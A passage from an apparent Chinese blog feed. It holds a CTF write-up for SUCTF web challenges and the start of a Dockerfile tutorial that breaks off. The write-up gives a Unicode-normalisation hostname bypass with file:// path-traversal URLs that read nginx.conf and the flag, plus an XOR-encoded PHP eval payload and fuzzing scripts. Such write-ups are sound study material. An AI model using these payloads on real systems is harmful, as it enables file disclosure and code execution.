<code>c/o</code>，于是我们可以利用这个构造 <code>suctf.cc/opt/../../</code> 读取文件，当然还有其它编码也可以，其实预期是利用 unicode2ascii 的域名转换导致的解析问题，在 blackhat <a href="https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf">HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization</a> 中有提到。</p><p><img src="https://s2.ax1x.com/2020/02/12/17n0VP.png" alt="17n0VP.png"></p><p>也就是找到一个可以通过 punycode 转为 <code>c</code> 的字符，引用<code>de1ta</code>的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urlparse,urlunsplit,urlsplit<br><span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> parse<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_unicode</span>():<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">65536</span>):<br>        uni=<span class="hljs-built_in">chr</span>(x)<br>        url=<span class="hljs-string">&quot;http://suctf.c&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(uni)<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">if</span> getUrl(url):<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;str: &quot;</span>+uni+<span class="hljs-string">&#x27; unicode: \\u&#x27;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(x))[<span class="hljs-number">2</span>:])<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getUrl</span>(<span class="hljs-params">url</span>):<br>    url = url<br>    host = parse.urlparse(url).hostname<br>    <span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    parts = <span class="hljs-built_in">list</span>(urlsplit(url))<br>    host = parts[<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    newhost = []<br>    <span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> host.split(<span class="hljs-string">&#x27;.&#x27;</span>):<br>        newhost.append(h.encode(<span class="hljs-string">&#x27;idna&#x27;</span>).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>    parts[<span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;.&#x27;</span>.join(newhost)<br>    finalUrl = urlunsplit(parts).split(<span class="hljs-string">&#x27; &#x27;</span>)[<span class="hljs-number">0</span>]<br>    host = parse.urlparse(finalUrl).hostname<br>    <span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    get_unicode()<br></code></pre></td></tr></table></figure><p>可得如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">str</span>: ℂ unicode: \u2102<br><span class="hljs-built_in">str</span>: ℭ unicode: \u212d<br><span class="hljs-built_in">str</span>: Ⅽ unicode: \u216d<br><span class="hljs-built_in">str</span>: ⅽ unicode: \u217d<br><span class="hljs-built_in">str</span>: Ⓒ unicode: \u24b8<br><span class="hljs-built_in">str</span>: ⓒ unicode: \u24d2<br><span class="hljs-built_in">str</span>: Ｃ unicode: \uff23<br><span class="hljs-built_in">str</span>: ｃ unicode: \uff43<br></code></pre></td></tr></table></figure><p>任一可以通过检测。</p><p>然后我们通过审计网页的源代码，可以发现提示了<code>nginx</code>，我们去读一下<code>nginx</code>的配置文件：</p><p><code>file://suctf.cＣ/../../../../usr/local/nginx/conf/nginx.conf</code></p><p><img src="https://s2.ax1x.com/2020/02/12/17ny8g.png" alt="17ny8g.png"></p><p>可以找到flag的路径，接下来直接读取flag：</p><p><code>file://suctf.cＣ/../../../../usr/fffffflag</code></p><h2 id="EasyPHP"><a href="#EasyPHP" class="headerlink" title="EasyPHP"></a>EasyPHP</h2><p>这题是代码审计，一看就是各种绕。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_the_flag</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-comment">// webadmin will remove your upload file every 20 min!!!! </span><br>    <span class="hljs-variable">$userdir</span> = <span class="hljs-string">&quot;upload/tmp_&quot;</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$userdir</span>))&#123;<br>    <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$userdir</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>]))&#123;<br>        <span class="hljs-variable">$tmp_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>];<br>        <span class="hljs-variable">$name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>];<br>        <span class="hljs-variable">$extension</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$name</span>, <span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$name</span>,<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/ph/i&quot;</span>,<span class="hljs-variable">$extension</span>)) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;^_^&quot;</span>); <br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$tmp_name</span>), <span class="hljs-string">&#x27;&lt;?&#x27;</span>)!==False) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;^_^&quot;</span>);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">exif_imagetype</span>(<span class="hljs-variable">$tmp_name</span>)) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;^_^&quot;</span>); <br>        <span class="hljs-variable">$path</span>= <span class="hljs-variable">$userdir</span>.<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$name</span>;<br>        @<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$tmp_name</span>, <span class="hljs-variable">$path</span>);<br>        <span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$path</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$hhh</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;_&#x27;</span>];<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$hhh</span>)&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$hhh</span>)&gt;<span class="hljs-number">18</span>)&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;One inch long, one inch strong!&#x27;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, <span class="hljs-variable">$hhh</span>) )<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Try something else!&#x27;</span>);<br><br><span class="hljs-variable">$character_type</span> = <span class="hljs-title function_ invoke__">count_chars</span>(<span class="hljs-variable">$hhh</span>, <span class="hljs-number">3</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$character_type</span>)&gt;<span class="hljs-number">12</span>) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Almost there!&quot;</span>);<br><br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$hhh</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>首先大概要绕过的点：</p><ol><li>传入字符长度可以构造 <code>_GET[x]</code> 来绕过</li><li><code>preg_match</code> 可以通过异或来绕过</li><li><code>count_chars()&gt;12</code> 的重复字符串绕过</li></ol><p><code>$hhh</code> 的长度不能超过18，其次，看一下这个正则匹配</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, <span class="hljs-variable">$hhh</span>)<br></code></pre></td></tr></table></figure><p>因此我们可以写脚本来 Fuzz 一下可用的有哪些：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env</span><br><span class="hljs-comment">#encoding=utf-8</span><br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>url = <span class="hljs-string">&#x27;http://ip/?_=&#x27;</span> <span class="hljs-comment"># 具体环境url</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>r = requests.get(url=url+<span class="hljs-built_in">chr</span>(i))<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(r.text) != <span class="hljs-number">19</span>:<br><span class="hljs-keyword">if</span> i &gt; <span class="hljs-number">127</span>:<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(i), end=<span class="hljs-string">&#x27; &#x27;</span>) <span class="hljs-comment"># 不可见字符用hex</span><br><span class="hljs-keyword">else</span>:<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(i), end=<span class="hljs-string">&#x27; &#x27;</span>) <span class="hljs-comment"># 可见字符直接打印</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>main()<br></code></pre></td></tr></table></figure><p>然后我们可以得到一下可用的字符。</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">! # $ <span class="hljs-comment">% &amp; ( ) * - / 0 : ; &lt; &gt; ? @ \ ] ^ &#123; &#125; 0x80 0x81 0x82 0x83 0x84 0x85 0x86 0x87 0x88 0x89 0x8a 0x8b 0x8c 0x8d 0x8e 0x8f 0x90 0x91 0x92 0x93 0x94 0x95 0x96 0x97 0x98 0x99 0x9a 0x9b 0x9c 0x9d 0x9e 0x9f 0xa0 0xa1 0xa2 0xa3 0xa4 0xa5 0xa6 0xa7 0xa8 0xa9 0xaa 0xab 0xac 0xad 0xae 0xaf 0xb0 0xb1 0xb2 0xb3 0xb4 0xb5 0xb6 0xb7 0xb8 0xb9 0xba 0xbb 0xbc 0xbd 0xbe 0xbf 0xc0 0xc1 0xc2 0xc3 0xc4 0xc5 0xc6 0xc7 0xc8 0xc9 0xca 0xcb 0xcc 0xcd 0xce 0xcf 0xd0 0xd1 0xd2 0xd3 0xd4 0xd5 0xd6 0xd7 0xd8 0xd9 0xda 0xdb 0xdc 0xdd 0xde 0xdf 0xe0 0xe1 0xe2 0xe3 0xe4 0xe5 0xe6 0xe7 0xe8 0xe9 0xea 0xeb 0xec 0xed 0xee 0xef 0xf0 0xf1 0xf2 0xf3 0xf4 0xf5 0xf6 0xf7 0xf8 0xf9 0xfa 0xfb 0xfc 0xfd 0xfe 0xff </span><br></code></pre></td></tr></table></figure><p>接下来考虑变量，因为还有 <code>$</code>，然后最短的变量就是 <code>$_GET</code>，在浏览器中这些字符都是敏感字符，如果不加单引号双引号，浏览器就把他们用起来了（浏览器进行解析，而不是php语言）所以我们要使用不可视的字符来进行异或脚本的基础字典。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 网上偷的脚本</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">XOR</span>():<br>_=[]<br>G=[]<br>E=[]<br>T=[]<br><span class="hljs-built_in">print</span>(a)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a[<span class="hljs-number">27</span>:]:<span class="hljs-comment"># 截取a列表27后面的数据，目的是避开可视字符。我们需要不可视字符来异或</span><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> a[<span class="hljs-number">27</span>:]:<br>tem = (i ^ j)<br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">chr</span>(tem) == <span class="hljs-string">&quot;_&quot;</span>):<br>_.append((<span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(i)[<span class="hljs-number">2</span>:])) + <span class="hljs-string">&quot;^&quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(j)[<span class="hljs-number">2</span>:]))<br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">chr</span>(tem) == <span class="hljs-string">&quot;G&quot;</span>):<br>G.append((<span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(i)[<span class="hljs-number">2</span>:])) + <span class="hljs-string">&quot;^&quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(j)[<span class="hljs-number">2</span>:]))<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">chr</span>(tem) == <span class="hljs-string">&quot;E&quot;</span>):<br>E.append((<span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(i)[<span class="hljs-number">2</span>:])) + <span class="hljs-string">&quot;^&quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(j)[<span class="hljs-number">2</span>:]))<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">chr</span>(tem) == <span class="hljs-string">&quot;T&quot;</span>):<br>T.append((<span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(i)[<span class="hljs-number">2</span>:])) + <span class="hljs-string">&quot;^&quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(j)[<span class="hljs-number">2</span>:]))<br><br><span class="hljs-built_in">print</span>(_)<br><span class="hljs-built_in">print</span>(G)<br><span class="hljs-built_in">print</span>(E)<br><span class="hljs-built_in">print</span>(T)<br></code></pre></td></tr></table></figure><p>结果很多，我就挑取比较好做的，取 <code>%85%85%85%85^%da%c2%c0%d1</code> ，然后还要考虑</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$character_type</span> = <span class="hljs-title function_ invoke__">count_chars</span>(<span class="hljs-variable">$hhh</span>, <span class="hljs-number">3</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$character_type</span>)&gt;<span class="hljs-number">12</span>) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Almost there!&quot;</span>);<br></code></pre></td></tr></table></figure><p>一波操作之后构造如下：</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mel">?_=$&#123;%85%85%85%85^%da%c2%c0%d1&#125;&#123;%85&#125;();&amp;%85=get_the_flag<br>?_=$_GET&#123;%85&#125;();&amp;%85=get_the_flag<br>构造调用get_the_flag()，其中%85为不可见字符，为了绕过conut_chars()。这个函数是统计一段字符串中重复出现的字符串，题目条件是不能超过<span class="hljs-number">12</span>。<br></code></pre></td></tr></table></figure><p>尝试发现已经绕过了，接下来就是第二层绕过了。</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WriteUps</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTF中Web的docker环境以及dockerfile编写</title>
    <link href="/2019/08/22/web_dockerfile_in_ctf/"/>
    <url>/2019/08/22/web_dockerfile_in_ctf/</url>
    
    <content type="html"><![CDATA[<h1 id="Dockfile"><a href="#Dockfile" class="headerlink" title="Dockfile"></a>Dockfile</h1><blockquote><p>Docker builds images automatically by reading the instructions from a Dockerfile – a text file that contains all commands, in order, needed to build a given image.</p></blockquote><p><code>Dockerfile</code>是一个包含用于组合映像的命令的文本文档。可以使用在命令行中调用任何命令。 Docker通过读取<code>Dockerfile</code>中的指令自动生成映像。</p><p><code>docker build</code>命令用于从<code>Dockerfile</code>构建映像。可以在<code>docker build</code>命令中使用<code>-f</code>标志指向文件系统中任何位置的<code>Dockerfile</code>。</p><p><a href="https://docs.docker.com/engine/reference/builder/">Dockerfile reference</a></p><p><a href="https://docs.docker.com/develop/develop-images/dockerfile_best-practices/">Best practices or writing Dockerfiles</a></p><h2 id="Dockerfile的基本结构"><a href="#Dockerfile的基本结构" class="headerlink" title="Dockerfile的基本结构"></a>Dockerfile的基本结构</h2><p><code>Dockerfile</code> 一般分为四部分：基础镜像信息、维护者信息、镜像操作指令和容器启动时执行指令，’#’ 为 <code>Dockerfile</code> 中的注释。</p><h2 id="Dockerfile文件说明"><a href="#Dockerfile文件说明" class="headerlink" title="Dockerfile文件说明"></a>Dockerfile文件说明</h2><p>Docker以从上到下的顺序运行Dockerfile的指令。为了指定基本映像，第一条指令必须是<em>FROM</em>。一个声明以<code>＃</code>字符开头则被视为注释。可以在Docker文件中使用<code>RUN</code>，<code>CMD</code>，<code>FROM</code>，<code>EXPOSE</code>，<code>ENV</code>等指令。</p><h2 id="常用指令"><a href="#常用指令" class="headerlink" title="常用指令"></a>常用指令</h2><h3 id="FROM"><a href="#FROM" class="headerlink" title="FROM"></a>FROM</h3><p>指定基础镜像，必须为第一个命令</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs vim">格式：<br>　　FROM <span class="hljs-symbol">&lt;image&gt;</span><br>　　FROM <span class="hljs-symbol">&lt;image&gt;</span>:<span class="hljs-symbol">&lt;tag&gt;</span><br>　　FROM <span class="hljs-symbol">&lt;image&gt;</span>@<span class="hljs-symbol">&lt;digest&gt;</span><br>示例：<br>　　FROM mysq<span class="hljs-variable">l:5</span>.<span class="hljs-number">6</span><br>注：<br>　　<span class="hljs-keyword">tag</span>或digest是可选的，如果不使用这两个值时，会使用latest版本的基础镜像<br></code></pre></td></tr></table></figure><h3 id="MAINTAINER"><a href="#MAINTAINER" class="headerlink" title="MAINTAINER"></a>MAINTAINER</h3><p>维护者信息</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">格式：<br>    <span class="hljs-keyword">MAINTAINER</span> &lt;name&gt;<br>示例：<br>    <span class="hljs-keyword">MAINTAINER</span> Iven Huang<br>    <span class="hljs-keyword">MAINTAINER</span> mcwingsgone@gmail.com<br>    <span class="hljs-keyword">MAINTAINER</span> <span class="hljs-number">52</span>HeRtz &lt;mcwingsgone@gmail.com&gt;<br></code></pre></td></tr></table></figure><h3 id="RUN"><a href="#RUN" class="headerlink" title="RUN"></a>RUN</h3><p>构建镜像时执行的命令</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">RUN</span>用于在镜像容器中执行命令，其有以下两种命令执行方式：<br><span class="hljs-keyword">shell</span>执行<br>格式：<br>    <span class="hljs-keyword">RUN</span> &lt;command&gt;<br>exec执行<br>格式：<br>    <span class="hljs-keyword">RUN</span> [<span class="hljs-string">&quot;executable&quot;</span>, <span class="hljs-string">&quot;param1&quot;</span>, <span class="hljs-string">&quot;param2&quot;</span>]<br>示例：<br>    <span class="hljs-keyword">RUN</span> [<span class="hljs-string">&quot;executable&quot;</span>, <span class="hljs-string">&quot;param1&quot;</span>, <span class="hljs-string">&quot;param2&quot;</span>]<br>    <span class="hljs-keyword">RUN</span> apk <span class="hljs-keyword">update</span><br>    <span class="hljs-keyword">RUN</span> [<span class="hljs-string">&quot;/etc/execfile&quot;</span>, <span class="hljs-string">&quot;arg1&quot;</span>, <span class="hljs-string">&quot;arg1&quot;</span>]<br>注：<br>　　<span class="hljs-keyword">RUN</span>指令创建的中间镜像会被缓存，并会在下次构建中使用。如果不想使用这些缓存镜像，可以在构建时指定--<span class="hljs-keyword">no</span>-cache参数，如：docker build --<span class="hljs-keyword">no</span>-cache<br></code></pre></td></tr></table></figure><h3 id="ADD"><a href="#ADD" class="headerlink" title="ADD"></a>ADD</h3><p>将本地文件添加到容器中，tar类型文件会自动解压(网络压缩资源不会被解压)，可以访问网络资源，类似wget</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros">格式：<br>    <span class="hljs-built_in">ADD</span> &lt;src&gt;<span class="hljs-built_in">..</span>. &lt;dest&gt;<br>    <span class="hljs-built_in">ADD</span> [<span class="hljs-string">&quot;&lt;src&gt;&quot;</span>,<span class="hljs-built_in">..</span>. <span class="hljs-string">&quot;&lt;dest&gt;&quot;</span>] 用于支持包含空格的路径<br>示例：<br>    <span class="hljs-built_in">ADD</span> hom* /mydir/          # 添加所有以<span class="hljs-string">&quot;hom&quot;</span>开头的文件<br>    <span class="hljs-built_in">ADD</span> hom?.txt /mydir/      # ? 替代一个单字符,例如：<span class="hljs-string">&quot;home.txt&quot;</span><br>    <span class="hljs-built_in">ADD</span> test relativeDir/     # 添加 <span class="hljs-string">&quot;test&quot;</span> 到 `WORKDIR`/relativeDir/<br>    <span class="hljs-built_in">ADD</span> test /absoluteDir/    # 添加 <span class="hljs-string">&quot;test&quot;</span> 到 /absoluteDir/<br></code></pre></td></tr></table></figure><h3 id="COPY"><a href="#COPY" class="headerlink" title="COPY"></a>COPY</h3><p>功能类似ADD，但是是不会自动解压文件，也不能访问网络资源</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gradle">格式:<br><span class="hljs-keyword">COPY</span> 资源文件位置 目标文件位置<br>示例:<br><span class="hljs-keyword">COPY</span> .<span class="hljs-regexp">/index.php /</span>var<span class="hljs-regexp">/www/</span>html/<br></code></pre></td></tr></table></figure><h3 id="CMD"><a href="#CMD" class="headerlink" title="CMD"></a>CMD</h3><p>构建容器后调用，也就是在容器启动时才进行调用</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">格式：<br>    <span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;executable&quot;</span>,<span class="hljs-string">&quot;param1&quot;</span>,<span class="hljs-string">&quot;param2&quot;</span>] (执行可执行文件，优先)</span><br>    <span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;param1&quot;</span>,<span class="hljs-string">&quot;param2&quot;</span>] (设置了ENTRYPOINT，则直接调用ENTRYPOINT添加参数)</span><br>    <span class="hljs-keyword">CMD</span><span class="language-bash"> <span class="hljs-built_in">command</span> param1 param2 (执行shell内部命令)</span><br>示例：<br>    <span class="hljs-keyword">CMD</span><span class="language-bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;This is a test.&quot;</span> | <span class="hljs-built_in">wc</span> -</span><br>    <span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;/usr/bin/wc&quot;</span>,<span class="hljs-string">&quot;--help&quot;</span>]</span><br>注：<br> 　　<span class="hljs-keyword">CMD</span><span class="language-bash">不同于RUN，CMD用于指定在容器启动时所要执行的命令，而RUN用于指定镜像构建时所要执行的命令。</span><br></code></pre></td></tr></table></figure><h3 id="VOLUME"><a href="#VOLUME" class="headerlink" title="VOLUME"></a>VOLUME</h3><p>用于指定持久化目录</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">格式：<br>    <span class="hljs-keyword">VOLUME</span><span class="language-bash"> [<span class="hljs-string">&quot;/path/to/dir&quot;</span>]</span><br>示例：<br>    <span class="hljs-keyword">VOLUME</span><span class="language-bash"> [<span class="hljs-string">&quot;/data&quot;</span>]</span><br>    <span class="hljs-keyword">VOLUME</span><span class="language-bash"> [<span class="hljs-string">&quot;/var/www&quot;</span>, <span class="hljs-string">&quot;/var/log/apache2&quot;</span>, <span class="hljs-string">&quot;/etc/apache2&quot;</span>注：　　一个卷可以存在于一个或多个容器的指定目录，该目录可以绕过联合文件系统，并具有以下功能：</span><br><span class="hljs-number">1</span> 卷可以容器间共享和重用<br><span class="hljs-number">2</span> 容器并不一定要和其它容器共享卷<br><span class="hljs-number">3</span> 修改卷后会立即生效<br><span class="hljs-number">4</span> 对卷的修改不会对镜像产生影响<br><span class="hljs-number">5</span> 